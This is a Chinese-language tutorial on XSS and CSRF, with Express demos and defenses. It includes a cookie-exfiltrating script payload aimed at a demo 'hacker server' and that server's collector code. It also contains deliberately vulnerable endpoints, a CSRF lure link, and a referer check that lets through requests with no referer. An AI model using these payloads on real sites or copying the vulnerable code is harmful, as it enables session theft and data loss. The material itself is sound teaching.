# [彻底弄懂XSS和CSRF](https://segmentfault.com/a/1190000023031910)

## 一、XSS简介

XSS 全称为(**Cross Site Scripting**)，即 **跨站脚本攻击**。同时为了**不和**层叠式样式表CSS(Cascading Style Sheets)**产生混淆**，故将跨站脚本攻击缩写为XSS。其是Web应用中常见的一种**漏洞**，攻击者通过**向网页中注入一段客户端脚本**(通常为JavaScript)，那么当**用户浏览该网页**的时候，脚本就会被执行，从而达到攻击的目的。

## 二、XSS分类

**① 反射型 (Reflected XSS)**
所谓反射型就是，用户在网页中输入的内容经页面提交到服务器后，**服务器没有对该数据进行存储**到数据库，而是**原封不动的反射回页面**中，即**用户输入什么内容**，**服务器就将其原封不动的显示到页面中**，从而让用户**立即被攻击**。最常见的就是搜索引擎，当我们搜索一个无法搜索到的内容时，搜索引擎通常会直接在页面中提示，该内容无法搜索到，此时如果**用户搜索的内容中包含一些攻击性的脚本**同时**服务器又没有对这些内容进行处理**，那么就会被攻击，如:
![屏幕快照 2020-06-26 下午6.31.52.png](https://segmentfault.com/img/bVbIL8v)

**② 存储型 (Stored XSS)**
所谓存储型就是，用户在网页中输入的内容经页面提交到服务器后，**服务器将该数据先原封不动的存储到数据库中**，等到其他用户访问该网站的时候，从服务器中读取出数据，从而让其中包含的脚本执行，所以**存储型不是立即被攻击**，而是等其他用户访问该网站的时候才生效，但是其由于被存储到了数据库中，所以其**攻击范围更广为网站的所有访问者**。最常见的就是某个黑客用户提交了一篇文章，而文章中被注入了一段脚本，而该文章会被提交到数据库中，所以等到其他用户访问该文章的时候就会被攻击。

反射型和存储型XSS的区别是看**用户提交的数据有没有被服务器存储起来**。

**③ 基于DOM (DOM-based or local XSS)**
所谓基于DOM类型就是，**使用到的数据没有经过服务器**，**而是直接从DOM、Window等对象中获取**，比如，**document.location**、**document.URL**、**document.referrer**，将这些数据插入到DOM中后导致的XSS攻击。比较常见的就是，当我们在某个网站注册成功后，通常会跳转到一个验证页面，验证页面内容主要包括多少秒之后自动跳转到某个页面，或者点击链接立即跳转到某个页面，如:**http://localhost:3000/validate.html？redirectTo=javascript:alert('xss')**，而我们的页面会**根据传入的redirectTo的值进行跳转**，如:

```
<script>
    var timer;
    var secs = 10;
    // 获取跳转的url地址
    var redirectTo = location.search.substring(location.search.indexOf("redirectTo=") + 11);
    function go() {
        secs--;
        if (secs >= 0 ) {
            document.getElementById("secs").innerText = secs + "秒之后将自动跳转";
        } else {
            location.href = redirectTo;
            clearInterval(timer);
        }
    }
    window.onload = function() {
        timer = setInterval(go, 1000);
        document.getElementById("redirect").href = redirectTo;
    }
</script>

<h1 id="secs"></h1>
<a id="redirect">立即跳转</a>
```

还有一种就是，**客户端输入校验**，当客户端校验用户输入不合法的时候，会在输入框后面显示用户输入内容并提示输入不合法，如:

```
<input id="ipt" type="text" value=""/>
<div id="xss">

document.getElementById("xss").innerHTML = document.getElementById("ipt").value;
```

此时用户如果输入**<img src="1" onerror="alert(1)"/>**，也会产生xss攻击。

**基于DOM类型的XSS攻击关键是数据没有经过服务器，而是来自于DOM操作**。

这里我们可能会产生疑问，我们**不用innerHTML用innerText不就可以避免XSS攻击了吗？**，其实XSS攻击和用不用innerHTML没有太大关系，对于客户端页面我们修改DOM的值可能会用到innerHTML和innerText，但是对于**服务端页面**，我们就**不需要通过innerHTML和innerText来修改DOM的值了**，后面会有实例演示，就会明白。

## 三、XSS的危害

前面介绍XSS的分类已经提到过一些XSS危害，看起来好像只是在用户界面弹了几个框而已，没什么太大的作用。然而一个漏洞所能造成的危害大小不在于漏洞本身，而是取决于**攻击者如何使用这个漏洞**。攻击者如果只是通过XSS漏洞在用户页面弹框，那么其危害自然很小，但是XSS本质是**向用户页面中注入客户端脚本**，而客户端脚本能做的事就非常多了，其中危害比较大的就是**盗取用户的cookie**。

我们先来看看cookie被盗取之后会造成什么严重的后果。这里以百度网站为例：
① 首先打开百度网站，然后使用用户名密码**登录百度账号**，如:
![屏幕快照 2020-06-27 上午11.02.52.png](https://segmentfault.com/img/bVbIMRz)

② 打开网页debug调试窗口下的Application下的Cookies，可以看到当前百度页面中保存的cookie，并且**找到带httpOnly的cookie**，这类cookie往往是比较重要的，其中**BDUSS**这个就是和登录有关的。
![屏幕快照 2020-06-27 上午11.06.45.png](https://segmentfault.com/img/bVbIMSN)

③ **打开另一个浏览器**，进入百度页面，此时处于未登录状态，同样打开网页debug调试窗口，输入document.cookie="BDUSS=上一步查看的BDUSS属性值"，如:
![屏幕快照 2020-06-27 上午11.10.19.png](https://segmentfault.com/img/bVbIMTu)

④ **刷新页面**，查看页面登录状态，发现另一个浏览器中的百度页面也登录成功了。

所以一旦攻击者通过XSS漏洞拿到了用户的cookie，那么就可以登录用户的账号，危害将会非常大。

## 四、XSS实例演示

假如有一个搜索页面，提供一个输入框供用户搜索，当用户点击搜索按钮后，进入搜索结果页面，会显示用户搜索的关键词内容和结果，如:

```
// 搜索页面index.html
<form method="GET" action="/search">
    <input type="text" name="keyword" value=""/>
    <button type="submit">搜索</button>
</form>
// 正常服务器代码
const express = require("express");
const session = require("express-session");
const app = express();
app.use(session({
    secret: 'keyboard cat', // 必须设置密钥字符串
    resave: false, // 每次请求都重新设置session cookie的过期时间
    saveUninitialized: true, // 用户访问服务器后是否保存还未初始化的session，即是否立即生成session
    name: "BDUSS", // sessionId的名称
    cookie: {
        httpOnly: false // 设置SessionId对应的cookie可以通过客户端脚本获取
    }
}));
app.use(express.static("public"));
app.use("/search", (req, res)  => {
    res.send(`
        <h1>你搜索的关键词是${req.query.keyword}</h1>
        <div>你的搜索结果如下:</div>
        <h2>!!!你搜索到了一个xss漏洞!!!</h2>
    `);
});
app.listen(3000);
```

服务器返回一个搜索结果页面，**直接将用户的搜索关键词放到页面中显示**。可以看到**服务器返回的页面并没有使用innerHTML和innerText修改DOM的值**。

```
// 黑客服务器代码
const express = require("express");
const app = express();
const cookies = [];
app.use("/cookie", (req, res)  => {
    console.log(req.query.cookie);
    if (req.query.cookie) {
        cookies.push(req.query.cookie);
    }
    res.send(`
        <h1>盗取的用户cookie:</h1>
        ${cookies}
    `);
});
app.listen(4000);
```

① 现在用户在浏览器中输入[http://localhost](https://link.segmentfault.com/?enc=L6mOE07X0un7PkRC%2BGAt7A%3D%3D.sF%2BGhEsq57yp9EKuBQuwChqR5kZJMuduIR11aSwszWY%3D):3000/就能访问到搜索页面，并且会产生一个sessionId放到cookie中(**模拟用户已登录**)。

② 当用户在搜索框中输入**<script>document.write('<img width=0 height=0 src="http://localhost:4000/cookie?cookie=' + document.cookie + '"/>')</script>**
黑客注入的脚本就是往搜索结果页面中添加一个宽度和高度都为0的图片，图片加载的时候就会向**黑客的服务器http://localhost:4000/cookie**发起请求，并将被攻击者的cookie发送给了黑客服务器。

③ 点击搜索按钮进入搜索结果页面，如:
![屏幕快照 2020-06-27 下午12.22.00.png](https://segmentfault.com/img/bVbIMY2)

④ 此时黑客访问http://localhost:4000/cookie页面就可以看到盗取的用户cookie，如:
![屏幕快照 2020-06-27 下午12.23.45.png](https://segmentfault.com/img/bVbIMY5)

## 五、XSS防御

**① 将用于登录相关的cookie设置为httpOnly，避免被客户端脚本直接读取。**
对于上面提到的实例，注入的脚本会通过**document.cookie**读取我们登录用的cookie，所以我们需要**将登录的cookie设置成httpOnly**即可，如:

```
app.use(session({
    secret: 'keyboard cat', // 必须设置密钥字符串
    resave: false, // 每次请求都重新设置session cookie的过期时间
    saveUninitialized: true, // 用户访问服务器后是否保存还未初始化的session，即是否立即生成session
    name: "BDUSS", // sessionId的名称
    cookie: {
        httpOnly: true // 禁止客户端通过js获取session对应的cookie
    }
}));
```

**② 对用户输入和输出进行过滤，对其中注入的脚本进行转义**
对于上面提到的实例，虽然通过给cookie设置上httpOnly已经无法读取登录用的cookie了，但是如果我们输入**<script>alert("xss")</script>**仍然可以弹窗，对于这种情况，我们需要对用户的输入进行转义，可以安装一个**xss模块**用于**过滤用户输入和输出**，如:

```
const xss = require("xss"); // 引入安装的xss模块用于数据的过滤
app.use("/search", (req, res)  => {
    res.send(`
        <h1>你搜索的关键词是${xss(req.query.keyword)}</h1>
        <div>你的搜索结果如下:</div>
        <h2>!!!你搜索到了一个xss漏洞!!!</h2>
    `);
});
```

经过转义后，搜索结果页面显示如下:
![屏幕快照 2020-06-27 下午4.02.26.png](https://segmentfault.com/img/bVbINco)

## 六、CSRF简介

CSRF 全称为(**Cross-Site Request Forgery**)，即**跨站请求伪造**，也称为**One Click Attack**，一键攻击，因为其通常会通过一个图片或者链接并**诱导用户去点击**，当用户点击这个图片或者链接后，**这个链接通常包含了一些攻击性的操作和参数**，即所谓的**伪造的请求**，就会**以用户的身份**向服务器发起这个伪造的请求，服务器收到这个伪造的请求后，就会认为是用户自己许可的操作，导致用户数据丢失等。

由于CSRF是伪造用户请求，并且以用户的身份向服务器发起请求，导致用户数据丢失，所以**用户必须先登录获取对应的登录cookie**之后，伪造的请求才会生效，才会导致用户数据丢失。所以CSRF攻击的前提条件是:

- 用户必须先登录信任网站，并且在本地生成对应的cookie；
- 在用户没有登出的情况下，访问了危险网站；

## 七、CSRF实例与危害

假如用户登录了某个网站，并且在上面发表了几篇文章，然后在未退出的情况下访问了某个危险性网站，然后在危险网站中点击了某个链接，导致其发表的文章全部被删除。
① **用户先登录**，这里仅仅是为了模拟用户登录，所以直接给其设置了一个用户名，如:

```
app.use("/login", (req, res) => {
    req.session.user = "lihb"; // 模拟用户登录，直接设置一个用户名
    res.send(`
        <h1>
            登录成功，欢迎${req.session.user}回来!
        </h1>
    `);
});
```

用户在浏览器中输入并访问**http://localhost:3000/login**，之后显示用户登录成功页面。
![屏幕快照 2020-06-27 下午7.00.47.png](https://segmentfault.com/img/bVbINqr)

② 登录成功后访问**http://localhost:3000/articles**查看其发布的文章。

```
let ariticles = [ // 模拟用户文章数据
    {
        id: 1,
        title: "这是文章标题1",
        content: "这是文章内容1"
    },
    {
        id: 2,
        title: "这是文章标题2",
        content: "这是文章内容2"
    }
];
app.use("/articles", (req, res) => {
    if (req.session.user === "lihb") {
        if (ariticles.length > 0) {
            const template = ariticles.map((article) => {
                return `<div><h3>${article.title}</h3><p>${article.content}</p></div>`
            }).join("");
            res.send(`
                <h1>${req.session.user}发布的文章为:</h1>
                ${template}
            `);
        } else {
            res.send(`<h1>${req.session.user}还没有发布文章。</h1>`);
        }
    } else {
        res.send(`<h1>请先去登录</h1>`);
    }
    
});
```

![屏幕快照 2020-06-27 下午6.59.28.png](https://segmentfault.com/img/bVbINqq)

③ 服务器中存在一个**http://localhost:3000/deleteAll**请求，可以直接删除全部文章，如:

```
app.use("/deleteAll", (req, res) => {
    if (req.session.user === "lihb") {
        ariticles = [];
        res.send(`<h1>${req.session.user}的文章被清空</h1>`);
    } else {
        res.send(`<h1>请先去登录</h1>`);
    }
});
```

④ 接着访问了一个危险网站**http://localhost:4000/csrf.html**，危险网站中包含一个诱导链接，会**诱导用户去点击**，而这个链接对应的地址就是删除全部文章的链接，用户一旦点击这个链接，将会导致其发布的文章全部被删除。

```
<!--csrf.html危险页面-->
<center>
    <a href="http://localhost:3000/deleteAll">点击领取爱奇艺会员</a>
</center>
```

![屏幕快照 2020-06-27 下午7.06.14.png](https://segmentfault.com/img/bVbINqI)

⑤ 用户点击上面的链接之后，显示页面如下:
![屏幕快照 2020-06-27 下午7.27.36.png](https://segmentfault.com/img/bVbINrp)

⑥ 此时**再次访问http://localhost:3000/articles**发现文章已经被全部删除导致用户数据丢失。

![屏幕快照 2020-06-27 下午7.28.12.png](https://segmentfault.com/img/bVbINrq)

至此就模拟完成了一次CSRF攻击。需要注意的是，**必须在用户已经登录的情况下才会成功**。如果我们在未登录的情况下访问了http://localhost:4000/csrf.html页面，那么攻击是无效的，会提示用户先去登录，如:
![屏幕快照 2020-06-27 下午7.30.57.png](https://segmentfault.com/img/bVbINrP)

## 八、CSRF防御

CSRF攻击成功的关键在于，**服务器无法识别该请求是不是用户授权的**。所以要想防御CSRF攻击，那么我们需要让服务器知道这个请求的真伪。
常见有以下几种方式:
① **增加token校验**: 用户登录成功后，**服务器生成一个token返回给客户端**，客户端收到token后**将其放到cookie或者localStorage中存储起来**，**cookie和localStorage都是无法跨域访问的**，所以**攻击者无法拿到其中的数据**，然后每次发起请求的时候都**带上这个token**，服务器校验这个token成功后才会响应该请求。

② **校验请求头的referer属性值**: 对于**点击某个网站(非本网站自己)上的链接**后发起的请求，那么请求头会带上referer属性，值为**该点击链接所在的网站的url地址**，所以我们可以根据请求头的referer属性来判断请求是否是来自本网站，如果不是则可用识别为CSRF攻击，如:

```js
app.use("/deleteAll", (req, res) => {
    // 增加请求头referer的校验
    if (req.headers.referer && !req.headers.referer.includes("http://localhost:3000")) {
        res.send(`<h1>这是一个CSRF请求，已被拦截</h1>`);
        return;
    }
    if (req.session.user === "lihb") {
        ariticles = [];
        res.send(`<h1>${req.session.user}的文章被清空</h1>`);
    } else {
        res.send(`<h1>请先去登录</h1>`);
    }
});
```